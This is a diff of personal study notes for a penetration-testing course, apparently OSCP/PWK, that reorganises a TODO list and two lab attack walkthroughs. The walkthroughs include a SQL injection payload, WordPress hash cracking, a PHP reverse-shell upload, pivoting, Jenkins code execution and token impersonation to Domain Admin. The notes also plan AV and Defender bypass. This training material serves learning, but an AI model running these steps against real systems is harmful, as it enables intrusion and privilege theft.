@@ -3792,102 +3792,6 @@ PS C:\Windows\system32> $ps01 = Get-PSSession -Id 1
      - [[https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020][msf payload reversing]]
      - [[https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86][msfvenom functions]]
 
-* TODO list
-  + (general osint, cp 6)
-----------------------------------------
-  + (gobuster and Burp, test in box)
-  + *Exploiting Admin Consoles, XSS, LFI && (RFI), DirTraversal, SQL (cp9.4 revisit), test in box*
----------------------------------------- 2nd
-  + *sqlmap, test in box*
----------------------------------------- 3rd
-  + *BO, p345-436, linux, Windows, practice*
-    - offset - length
-    - half offset
-    - *bad chars (how to infer)*
----------------------------------------- 4th, ++
-  + exploit search, p455-476, common fixes, one bytes, other techniques
-  + *Windows payload AV bypass(p490-511)*? (check exam examples)
-  + *post enumeration scripts (linux, windows, try in box)*
----------------------------------------- 5-9th
-  + privilege escalation methods (general), DCOM etc. video, common pattern
----------------------------------------- 10th
-  + basic pw atks(p572-595)
-  + AD, kerberos revisit (p622-p677) [[Book3_Chapter 21 Active Directory Attacks]]
-    - AD, LDAP enum users
-    - AD, enum flow
-    - escalate from local admin
-  + *mimikatz manual ops(the modified ver, try in box)*
----------------------------------------- 11th
-  + the msf
-    - meterpreter common usage, AV evasion, auto pilot all boxes first.
-    - *msfvenom*, use the different format.
-  + manual migration
-  + (empire, on exam? info)
-  + (log injection)
-  + msf tools fast access
-  + AV bypassing script
-    - with Admin, util scripts to turn off Windows Defender && firewall
-    - without Admin, obfuscation, string substitution.
-    - file splitting
-  + pivoting: ssh port-forward (local, remote, dynamic)
-  + useful linux file structure (/proc, /dev)
-  + *stand-alone multi/handler and payload*
-  + (reflective dll injection)
-  + msfvenom, windows, linux payload execute methods summary.
-  + *Windows, admin -> SYSTEM*
-  + the meterpreter workflow (use on Kerberos? time consideration? merit?) 
-    - ref:
-      + cheetsheet: [[https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf][an old meterpreter cheetsheet]], [[https://www.offensive-security.com/metasploit-unleashed/msfcli/][msfconsole -x]]
-      + the incognito module, the example workflow [[https://www.offensive-security.com/metasploit-unleashed/fun-incognito/][meterpreter incognito]] (need SYSTEM)
-  + *SeImpersonate Internal && AV Bypassing (fs)*
-     
-** boxes
-   1. ensure 100% with msf.
-   2. same exploit manually.
-   3. different routines.
-     
-** exam preparation
-   1. read and summarize about the topics in the syllabus (possible routines, methods, tools)>
-   2. use tools on boxes.
-
-** flows:
-*** PWK cp24, wordpress webserver (linux) -> sql server (linux)
-    - `sudo bash -c "echo '10.11.1.250 sandbox.local' >> /etc/hosts"`
-    - nmap `sudo nmap -sC -sS -p0-65535 sandbox.local` -> web application
-    - `dirb http://sandbox.local`
-    - application specific scanner `wpscan --url sandbox.local --enumerate ap,at,cb,dbe` ## plugins
-    - find the right keywords and target(wp plugins)`searchsploit survey poll`
-    - follow the exploit, TODO Burp and SQL Injection (PWK p755) `OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]`
-    - the SQL Injection -> wp username and pw hash
-    - (try to crack the pw -> get the wp pw) `echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" > pass.txt`
-    - `john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt`
-    - wp admin -> wp plugin PHP reverse shell. (upload and install)
-    - `seclists/Web-Shells/WordPress/plugin-shell.php`
-    - use curl/wget to upload payload. -> reverse shell
-    - enum server. in `wp-config.php` find DB server info.
-    - use bash `portscan.sh` to enum the open ports
-    - ssh Remote port forward the DB port.
-    - find mysql exploits -> udf -> need write permission
-    - kernel exploit on the wp server -> root -> sql root pw from the command history -> udf to get the shell from the sql server
-      
-*** PWK cp24, windows 
-    - prev on the sql server, /etc/fstab -> ip && content in mounted shared fs -> clear-text username && password
-    - ssh remote forward 1080 (socks4), config /etc/proxychains.conf (PWK p800), `socks4 127.0.0.1 1080`
-    - nmap with proxychains: `proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20` -> reveal opened 3389
-    - xfreedrp with proxychains: `proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard`
-    - [[Post-Exploitation Enumeration (Windows)]]: opened ports, account permission, wmic (auto start service)
-    - found Unquoted Search Path -> parse payload, bypass AV, download from browser -> root (poultry)
-    - use `cmd ping` to detect live servers
-    - use `proxychains nmap` to scan open ports
-    - on open Ports scan further with default scripts `nmap -sC` (PWK p819)
-    - 30 is a DC, which tends to be hardened. 25 has opened `8080 http-proxy` -> config firefox proxy and visit the page (proxy SOCKS v4 127.0.0.1:1080)(PWK p822) -> Jenkins server
-    - Inspect Element, Expand All, try weak password -> admin admin logged success.
-    - Check the Jenkins documentation -> code execution -> download payload -> reverse shell (jenkinsuser, SYSTEM)
-    - `use incognito; list_tokens -u` find sandbox\Administrator who is Domain Admins
-    - `impersonate_token sandbox\\Administrator`
-    - nslookup -> `_ldap._tcp.dc._msdcs.sandbox.local` returns DC's ComputerName.
-    - `$s=New-PSSession -Computer <ComputerName>` get remote session on DC.
-
       
 * AV bypass
 ** windows, powershell
@@ -5170,3 +5074,99 @@ ipython
     |    1 |  1 |  1 |  1 |  0 |
       - F = AB'C + AC' + A'C 
       - validation -- 0111: 0&&1' || 1&&1 || 0&&0&1 = 1
+      
+
+* Book3_Review
+** flows:
+*** PWK cp24, wordpress webserver (linux) -> sql server (linux)
+    - `sudo bash -c "echo '10.11.1.250 sandbox.local' >> /etc/hosts"`
+    - nmap `sudo nmap -sC -sS -p0-65535 sandbox.local` -> web application
+    - `dirb http://sandbox.local`
+    - application specific scanner `wpscan --url sandbox.local --enumerate ap,at,cb,dbe` ## plugins
+    - find the right keywords and target(wp plugins)`searchsploit survey poll`
+    - follow the exploit, TODO Burp and SQL Injection (PWK p755) `OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]`
+    - the SQL Injection -> wp username and pw hash
+    - (try to crack the pw -> get the wp pw) `echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" > pass.txt`
+    - `john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt`
+    - wp admin -> wp plugin PHP reverse shell. (upload and install)
+    - `seclists/Web-Shells/WordPress/plugin-shell.php`
+    - use curl/wget to upload payload. -> reverse shell
+    - enum server. in `wp-config.php` find DB server info.
+    - use bash `portscan.sh` to enum the open ports
+    - ssh Remote port forward the DB port.
+    - find mysql exploits -> udf -> need write permission
+    - kernel exploit on the wp server -> root -> sql root pw from the command history -> udf to get the shell from the sql server
+      
+*** PWK cp24, windows 
+    - prev on the sql server, /etc/fstab -> ip && content in mounted shared fs -> clear-text username && password
+    - ssh remote forward 1080 (socks4), config /etc/proxychains.conf (PWK p800), `socks4 127.0.0.1 1080`
+    - nmap with proxychains: `proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20` -> reveal opened 3389
+    - xfreedrp with proxychains: `proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard`
+    - [[Post-Exploitation Enumeration (Windows)]]: opened ports, account permission, wmic (auto start service)
+    - found Unquoted Search Path -> parse payload, bypass AV, download from browser -> root (poultry)
+    - use `cmd ping` to detect live servers
+    - use `proxychains nmap` to scan open ports
+    - on open Ports scan further with default scripts `nmap -sC` (PWK p819)
+    - 30 is a DC, which tends to be hardened. 25 has opened `8080 http-proxy` -> config firefox proxy and visit the page (proxy SOCKS v4 127.0.0.1:1080)(PWK p822) -> Jenkins server
+    - Inspect Element, Expand All, try weak password -> admin admin logged success.
+    - Check the Jenkins documentation -> code execution -> download payload -> reverse shell (jenkinsuser, SYSTEM)
+    - `use incognito; list_tokens -u` find sandbox\Administrator who is Domain Admins
+    - `impersonate_token sandbox\\Administrator`
+    - nslookup -> `_ldap._tcp.dc._msdcs.sandbox.local` returns DC's ComputerName.
+    - `$s=New-PSSession -Computer <ComputerName>` get remote session on DC.
+
+** HOLD list
+  + (general osint, cp 6)
+
+** TODO list
+  + (gobuster and Burp, test in box)
+  + *Exploiting Admin Consoles, XSS, LFI && (RFI), DirTraversal, SQL (cp9.4 revisit), test in box*
+---------------------------------------- 2nd
+  + *sqlmap, test in box*
+---------------------------------------- 3rd
+  + *BO, p345-436, linux, Windows, practice*
+    - offset - length
+    - half offset
+    - *bad chars (how to infer)*
+---------------------------------------- 4th, ++
+  + exploit search, p455-476, common fixes, one bytes, other techniques
+  + *Windows payload AV bypass(p490-511)*? (check exam examples)
+  + *post enumeration scripts (linux, windows, try in box)*
+---------------------------------------- 5-9th
+  + privilege escalation methods (general), DCOM etc. video, common pattern
+---------------------------------------- 10th
+  + basic pw atks(p572-595)
+  + AD, kerberos revisit (p622-p677) [[Book3_Chapter 21 Active Directory Attacks]]
+    - AD, LDAP enum users
+    - AD, enum flow
+    - escalate from local admin
+  + *mimikatz manual ops(the modified ver, try in box)*
+---------------------------------------- 11th
+  + the msf
+    - meterpreter common usage, AV evasion, auto pilot all boxes first.
+    - *msfvenom*, use the different format.
+  + manual migration
+  + (empire, on exam? info)
+  + (log injection)
+  + msf tools fast access
+  + AV bypassing script
+    - with Admin, util scripts to turn off Windows Defender && firewall
+    - without Admin, obfuscation, string substitution.
+    - file splitting
+  + pivoting: ssh port-forward (local, remote, dynamic)
+  + useful linux file structure (/proc, /dev)
+  + *stand-alone multi/handler and payload*
+  + (reflective dll injection)
+  + msfvenom, windows, linux payload execute methods summary.
+  + *Windows, admin -> SYSTEM*
+  + the meterpreter workflow (use on Kerberos? time consideration? merit?) 
+    - ref:
+      + cheetsheet: [[https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf][an old meterpreter cheetsheet]], [[https://www.offensive-security.com/metasploit-unleashed/msfcli/][msfconsole -x]]
+      + the incognito module, the example workflow [[https://www.offensive-security.com/metasploit-unleashed/fun-incognito/][meterpreter incognito]] (need SYSTEM)
+  + *SeImpersonate Internal && AV Bypassing (fs)*
+
+*** boxes 
+   1. ensure 100% with msf && meterpreter
+   2. same exploit manually.
+   3. different routines.
+     
